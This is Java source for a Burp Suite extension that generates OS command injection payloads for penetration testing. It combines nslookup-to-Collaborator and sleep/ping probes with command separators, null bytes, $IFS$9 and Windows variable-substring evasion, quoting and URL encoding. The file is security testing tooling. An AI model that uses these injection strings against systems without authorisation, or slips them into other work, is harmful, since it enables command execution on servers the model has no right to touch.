package uk.co.pentest.SHELLING;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IIntruderPayloadGenerator;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.ListModel;

/**
 * This is the new payload generator class for the Scanner - currently existing simultaneously with the Intruder Payload Generator; the final goal is to entirely move the payload generation from IntruderPayloadGenerator into this class
 * @author ewilded
 */

public final class ShellingPayloadGenerator  
{
    private static ShellingPayloadGenerator instance; // singleton    
    private IBurpExtenderCallbacks callbacks = BurpExtender.getBurpCallbacks();
    ShellingTab tab;
    
    int payloadIndex;                   // counter for the getNextPayload and hasMorePayloads methods
    boolean payloadMarking;             // whether or not to use payload marking
    Integer cnt=0;                      // counter for the payload marker    

    ArrayList<String> shellings;        // the final payloads
    ArrayList<String> shellings_raw;    // payloads before output encoding  
    ArrayList<String> basePayloads;     // my @BASE_PAYLOADS=($PAYL);
    

    ArrayList<String> argumentSeparators;        // my @ARGUMENT_SEPARATORS=('%20%20',"%09%09");
    ArrayList<String> commandSeparators;         // my @COMMAND_SEPARATORS=('%0a%0a','%26','|');
    ArrayList<String> commandTerminators;        // my @COMMAND_TERMINATORS=("%00",'%F0%9F%92%A9');
    ArrayList<String> nixCommandSeparators;
    ArrayList<String> nixArgumentSeparators;      
    ArrayList<String> nixCommandTerminators;
    ArrayList<String> winCommandSeparators;
    ArrayList<String> winArgumentSeparators;
    ArrayList<String> winEchoArgumentSeparators;
    ArrayList<String> prefixes;
    ArrayList<String> prefixSuffixes;   
    String command;
    String argument;
    String targetOS;
    String winPayload;                     // the base payload in high level form ({COMMAND}{SEPARATOR}{ARGUMENT})
    String nixPayload;                     // will differ if the feedback channel is time (as opposed to DNS, whereas nslookup call looks exactly the same)
    String feedbackChannel;
    String mode="auto"; // possible values: auto (scanner + intruder), manual (intruder only)

    // 
    public static ShellingPayloadGenerator getInstance(ShellingTab tab, String feedbackChannel)
    {
        if(instance==null)
        {
            instance = new ShellingPayloadGenerator(tab, feedbackChannel);
        }
        return instance;
    }
    private ShellingPayloadGenerator(ShellingTab tab, String feedbackChannel) 
    {
        this.tab=tab;
        this.feedbackChannel=feedbackChannel;
        this.mode=this.tab.shellingPanel.mode;
        this.feedbackChannel=this.tab.shellingPanel.feedbackChannel;
        shellings=new ArrayList<>();
        shellings_raw=new ArrayList<>();
        basePayloads=new ArrayList<>();
        this.feedbackChannel=feedbackChannel; // possible options are DNS and sleep
        argumentSeparators=new ArrayList<>();
        argumentSeparators=new ArrayList<>();
        commandSeparators=new ArrayList<>();         // my @COMMAND_SEPARATORS=('%0a%0a','%26','|');
        commandTerminators=new ArrayList<>();        // my @COMMAND_TERMINATORS=("%00",'%F0%9F%92%A9');
        nixCommandSeparators=new ArrayList<>();
        nixArgumentSeparators=new ArrayList<>();
        nixCommandTerminators=new ArrayList<>();
        winCommandSeparators=new ArrayList<>();
        winArgumentSeparators=new ArrayList<>();
        winEchoArgumentSeparators=new ArrayList<>();
        prefixes=new ArrayList<>();
        prefixSuffixes=new ArrayList<>();
        
        // Collecting user configuration from the panel interface
        //this.prefixes.add(this.tab.shellingPanel.commandPrefixField.getText());          
        this.prefixes.add("PREFIX_HOLDER"); // this will be replaced in a late (getNextPayload() in the IntruderPayloadGenerator) stage by the base payload
        this.prefixSuffixes.add("'");
        this.prefixSuffixes.add("\"");
        if(this.tab.shellingPanel.payloadMarkingBox.isSelected())
        {
            this.payloadMarking=true;
        }
        else
        {
            this.payloadMarking=false;
        }                   
        
        targetOS=this.tab.shellingPanel.targetOS; 
        
        // manual mode arguments
        command=this.tab.shellingPanel.commandField.getText();
        argument=this.tab.shellingPanel.argumentField.getText().trim();
                
        if(mode=="auto")
        {
            if(feedbackChannel=="DNS")
            {                
                // fetch the domain from collaborator, then prepend with the payload mark                                                          
                command="nslookup";
                argument="burpcollabdomain";
                winPayload=nixPayload=command+"ARGUMENT_SEPARATOR"+argument;                
            }
            else // time
            {
                winPayload="pingARGUMENT_SEPARATOR-nARGUMENT_SEPARATOR15ARGUMENT_SEPARATOR127.0.0.2";
                nixPayload="sleepARGUMENT_SEPARATOR15";
                command="sleep";
                argument="15";
            }
        }
        else // manual mode
        {
            winPayload=nixPayload=command+"ARGUMENT_SEPARATOR"+argument;
        }        
        
        // let's initiate the building element variables
        // universal argument separators
        this.argumentSeparators.add(" "); // space 
        this.argumentSeparators.add(this.byteToString((byte)0x09)); // 09, horizontal tab
        
        // universal command separators
        this.commandSeparators.add(this.byteToString((byte)0x0a));  // newline
        this.commandSeparators.add("&");                            // ampersand
        this.commandSeparators.add("|");                            // pipe
        
        // command/string terminators
        // this.commandTerminators.add("ðŸ’©");                           // the poo character, this should only work with asynchronous strings entering a mysql database first, should be disabled by default
        this.commandTerminators.add(this.byteToString((byte)0x00));     // nullbyte

        // OS-specific command separators
        // nix-like command separators
        this.nixCommandSeparators.add(";");                             // semicolon
        
        // nic-like argument separators
        this.nixArgumentSeparators.add("$IFS$9");                       // $IFS$9
        
        this.nixCommandTerminators.add(" #");
        
        this.winCommandSeparators.add(this.byteToString((byte)0x1a));
        
        this.winArgumentSeparators.add(this.byteToString((byte)0x0b));
        this.winArgumentSeparators.add("%25ProgramFiles:~10,1%25");
        
        
        this.winEchoArgumentSeparators.add("(");
        this.winEchoArgumentSeparators.add(".");    
        
        this.winCommandSeparators.add(this.byteToString((byte)0x26)+"::");
        
        // let's start building
        if("nix".equals(targetOS)||"all".equals(targetOS))
        {
            basePayloads.add(nixPayload);
            this.basePayloads.add("$("+nixPayload+")");
            this.basePayloads.add("`"+nixPayload+"`");
            this.basePayloads.add("{"+command+","+argument+"}");// the brace operator
            
            for(int i=0;i<this.nixCommandSeparators.size();i++)
            {
                this.commandSeparators.add(this.nixCommandSeparators.get(i));
            }
            for(int i=0;i<this.nixArgumentSeparators.size();i++)
            {
                this.argumentSeparators.add(this.nixArgumentSeparators.get(i));
            } 
        }
        
        if("win".equals(targetOS)||"all".equals(targetOS))
        {                  
            this.basePayloads.add(winPayload);   // if duplicates appear, check for existence          
            this.basePayloads.add("`"+winPayload+"`"); // backtick can work in windows as well, if injected through PHP/python/perl I believe
            for(int i=0;i<this.winCommandSeparators.size();i++)
            {
                this.commandSeparators.add(this.winCommandSeparators.get(i));
            }            
            for(int i=0;i<this.winArgumentSeparators.size();i++)
            {
                this.argumentSeparators.add(this.winArgumentSeparators.get(i));
            } 
            /*
            if(command.equals("echo"))          
            {
                for(int i=0;i<this.winEchoArgumentSeparators.size();i++)
                {
                    this.argumentSeparators.add(this.winEchoArgumentSeparators.get(i));
                    this.winArgumentSeparators.add(this.winEchoArgumentSeparators.get(i));
                } 
            }
            */
        }
        
        // automatically prefix prefixes with quotes in order to gain quoted injection compatibility
        ArrayList<String> tmpPrefixes=new ArrayList<>();
        tmpPrefixes=(ArrayList<String>)prefixes.clone();
        for(int i=0;i<tmpPrefixes.size();i++)
        {
            for(int j=0;j<prefixSuffixes.size();j++)
            {
                prefixes.add(tmpPrefixes.get(i)+this.prefixSuffixes.get(j));
            }
        }                      
        // First, we fill our output payloads list wth all variations of base payloads, including different argument separators
        for(int i=0;i<this.argumentSeparators.size();i++)
        {
           for(int j=0;j<this.basePayloads.size();j++)
           {
               String myCurrPayload=this.basePayloads.get(j);
               if(this.incompatibleTargets(this.argumentSeparators.get(i), myCurrPayload, "separator"))
               {
                   continue; 
               }
               myCurrPayload=myCurrPayload.replace("ARGUMENT_SEPARATOR",this.argumentSeparators.get(i));
               this.shellings_raw.add(myCurrPayload);
           }
        }
        
        this.basePayloads=(ArrayList<String>)this.shellings_raw.clone();   // overwrite the base with different base command_separator variants        
        
        // 2) MALICIOUS_COMMAND+COMMAND_TERMINATOR 
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandTerminators.size();j++)
            {
                if(this.incompatibleTargets(this.commandTerminators.get(j),this.basePayloads.get(i),"terminator"))
                {
                    continue;
                }
                String currPayload=this.basePayloads.get(i)+this.commandTerminators.get(j);
                this.shellings_raw.add(currPayload);
            }
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }                
               this.shellings_raw.add(this.basePayloads.get(i)+this.commandSeparators.get(j));               
            }
        }
        // 3) COMMAND_SEPARATOR+MALICIOUS_COMMAND
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }   
                this.shellings_raw.add(this.commandSeparators.get(j)+this.basePayloads.get(i));                
            }
        }
        // 4) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR
        // I think this makes the above section 3) redundant, because:
        // - if the application is appending our payload with something, 3) will fail, while 4) will work
        // - if the application is not accepting COMMAND_SEPARATOR, both variants will fail, so 3) is not helping anyway
        // - if the application is rejecting values that do not end with alphanum (which is how any of our MALICIOUS_COMMANDS would end), 4) will fail - but this is why we have the + SUFFIX variant - 5) - right?
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }   
                this.shellings_raw.add(this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j));                
            }
        }
        // 5) COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX      
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }   
                for(int k=0;k<this.prefixes.size();k++)
                {
                  String suffix=this.prefixes.get(k);
                  if(suffix=="'"||suffix=="") 
                  {
                      continue; //skip irrelevant payloads                  
                  }                  
                  this.shellings_raw.add(this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j)+suffix);                
                }
            }
        }
        // 6) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                } 
                for(int k=0;k<this.prefixes.size();k++)
                {
                    String currPayload=this.prefixes.get(k)+this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j);
                    if(currPayload.contains("'"))
                    {
                        currPayload=currPayload+"'";
                    }
                    else if(currPayload.contains("\""))
                    {
                        currPayload=currPayload+"\"";
                    }
                    this.shellings_raw.add(currPayload);
                }
            }
        }
        // 7) PREFIX+COMMAND_SEPARATOR+MALICIOUS_COMMAND+COMMAND_SEPARATOR+SUFFIX 
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.commandSeparators.size();j++)
            {
                if(this.incompatibleTargets(this.commandSeparators.get(j),this.basePayloads.get(i),"separator"))
                {
                    continue;
                }   
                for(int k=0;k<this.prefixes.size();k++)
                {
                  String suffix=this.getProperSuffix(this.prefixes.get(k));                 
                  this.shellings_raw.add(this.prefixes.get(k)+this.commandSeparators.get(j)+this.basePayloads.get(i)+this.commandSeparators.get(j)+suffix);                
                }
            }
        }       
        // 8) PREFIX+MALICIOUS_COMMAND+SUFFIX for substitutions - `CMD` and $(CMD) 
        
        
        for(int i=0;i<this.basePayloads.size();i++)
        {
            for(int j=0;j<this.prefixes.size();j++)
            {
                String basePayload=this.basePayloads.get(i);          
                if(!basePayload.startsWith("$")&&!basePayload.startsWith("`"))
                {                   
                    continue;
                }
                String prefix=this.prefixes.get(j);
                String suffix=this.getProperSuffix(prefix);
                this.shellings_raw.add(prefix+basePayload+suffix);
            }
        }                
        // OK, what's left now is the output encoding + payload marking

        // now we have to deal with the output encodings
        ListModel encodeModel = this.tab.shellingPanel.encodeList.getModel();
        for(int j=0;j<this.shellings_raw.size();j++)
        {
            for(int i=0;i<encodeModel.getSize();i++)
            {
                if("None".equals(encodeModel.getElementAt(i).toString()))
                {                   
                    String outputPayload=this.getMarkedVersion(this.shellings_raw.get(j));
                    this.shellings.add(outputPayload);
                }
                if("URL".equals(encodeModel.getElementAt(i).toString())) // URL encode
                {
                   String outputPayload=this.getMarkedVersion(this.shellings_raw.get(j));
                   try {                    
                    this.shellings.add(URLEncoder.encode(outputPayload,StandardCharsets.UTF_8.toString()));
                    } 
                   catch (UnsupportedEncodingException ex) {
                      Logger.getLogger(IntruderPayloadGenerator.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
                if("Double URL".equals(encodeModel.getElementAt(i).toString()))
                {
                       String outputPayload=this.getMarkedVersion(this.shellings_raw.get(j));
                       try {                       
                           this.shellings.add(URLEncoder.encode(URLEncoder.encode(outputPayload,StandardCharsets.UTF_8.toString())));
                       } 
                       catch (UnsupportedEncodingException ex) {
                           Logger.getLogger(IntruderPayloadGenerator.class.getName()).log(Level.SEVERE, null, ex);
                       }
                }
            }
        }
   
    }
    private String getMarkedVersion(String payload)
    {        
        cnt++;
        if(this.payloadMarking)
        {
            String replacement=cnt.toString();
            if(payload.contains("$IFS$9")) // if dealing with $IFS$9
            {
                replacement="a"+replacement;
            }   
            payload=payload.replace("PAYLOAD_MARK",replacement);
        }
        else
        {
            payload=payload.replace("PAYLOAD_MARK","");
        }
        return payload;
    }
    private String byteToString(byte inputByte)
    {
        byte[] t = new byte[1];
        t[0]=inputByte;
        return callbacks.getHelpers().bytesToString(t);
    }    
    private boolean arraySearch(String needle, String[] hayStack)
    {
        for(int i=0;i<hayStack.length;i++)
        {
            if(hayStack[i]==needle) return true;
        }
        return false;
    }
    private boolean incompatibleTargets(String entity, String payload, String what)
    {
        if(targetOS!="all") return false; // it's either strictly win or nix - in such case there should be no incompatible elements in the configuration in the first place
        // this might become false if we allow people to play with the the separators themselves (define their own ones)
        // in such case we'll remove this lind and perform the check every time this function is called
        String cmdPattern = command+"(.*)"+argument;
        String separator="";
               
        Pattern pattern = Pattern.compile(cmdPattern);
        Matcher matcher = pattern.matcher(payload);
        if(!matcher.matches())
        {
            separator=matcher.group(1);
        }
        
        // whether the payload seem nix-like
        if(arraySearch(separator,(String[])this.nixArgumentSeparators.toArray())||payload.contains("`")||payload.contains("$"))
        {
            if("separator".equals(what))
            {
                if(arraySearch(entity,(String[])this.winArgumentSeparators.toArray()))
                {
                    return true;
                }
                if(arraySearch(entity,(String[])this.winCommandSeparators.toArray()))
                {
                    return true;
                }               
                return false;
            }
            if("terminator".equals(what))
            {
                if(arraySearch(entity,(String[])this.winCommandSeparators.toArray()))
                {
                    return true;
                }
                return false;
            }
            return false; 
        }
        if(arraySearch(separator,(String[])this.winArgumentSeparators.toArray())) // dealing with windows
        {
            if("separator".equals(what))
            {
                if(arraySearch(entity,(String[])this.nixCommandSeparators.toArray()))
                {
                  return true;   
                }
                if(arraySearch(entity,(String[])this.nixArgumentSeparators.toArray()))
                {
                  return true;   
                }
                return false;
            }
            if("terminator".equals(what))
            {
                if(arraySearch(entity,(String[])this.nixCommandTerminators.toArray()))
                {
                    return true;
                }
                return false;
            }
        }       
        return false;
    }
    private String getProperSuffix(String prefix)
    {
        String suffix=prefix;
        if(prefix.contains("'"))
        {
            suffix=suffix.replace("'","");
            suffix="'"+suffix;
        }
        else if(prefix.contains("\""))
        {
            suffix=suffix.replace("\"","");
            suffix="\""+suffix;
            
        }        
	return suffix;
    }
    
    // Interuder hasMorePayloads() will simply be an overlay on this
    public boolean hasMorePayloads() 
    {
      return this.payloadIndex < this.shellings.size();      
    }
    // Interuder getNextPayload() will simply be an overlay on this
    public synchronized byte[] getNextPayload(byte[] baseValue)  // generatePayload counterpart
    {                
        byte[] payload  = new byte[0];
        // return the path payload
        String p = this.shellings.get(this.payloadIndex);
        if(p.contains("PREFIX_HOLDER"))
        {                
           String base = callbacks.getHelpers().bytesToString(baseValue);
           p=p.replace("PREFIX_HOLDER",base);
        }
        payload = callbacks.getHelpers().stringToBytes(p);           
        
        this.payloadIndex++; // increase the index
        return payload;
    }
    // Intruder reset() will simply be an overlay on this
    public void reset() 
    {        
        payloadIndex = 0;
    }       
}